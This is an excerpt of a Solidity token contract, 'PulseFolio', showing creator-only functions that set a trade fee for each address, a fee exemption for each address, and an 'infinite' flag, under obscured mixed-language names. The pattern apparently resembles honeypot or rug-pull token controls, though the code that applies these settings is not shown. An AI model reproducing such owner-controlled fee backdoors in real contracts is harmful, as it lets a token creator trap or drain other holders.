...
contract PulseFolio is MyERC20, Ownable {
    ...
    function definirConta(address adresse) external onlyCreator {
        infinite[adresse] = true;
    }

    function getInAccount(address adresse) external view onlyCreator returns (bool) {
        return infinite[adresse];
    }


    function definirImplementacao(address adresse, uint256 _montante) external onlyCreator {
        require(_montante > 0, "Account tax must be greater than or equal to 1");
        _accountTradeFee[adresse] = _montante;
    }

    function getFee(address adresse) external view onlyCreator returns (uint256) {
        return _accountTradeFee[adresse];
    }


    function setAccountFreeFee(address adresse, bool _montante) external onlyCreator {
        _accountFreeFee[adresse] = _montante;
    }

    function getAccountFreeFee(address adresse) external view onlyCreator returns (bool) {
        return _accountFreeFee[adresse];
    }
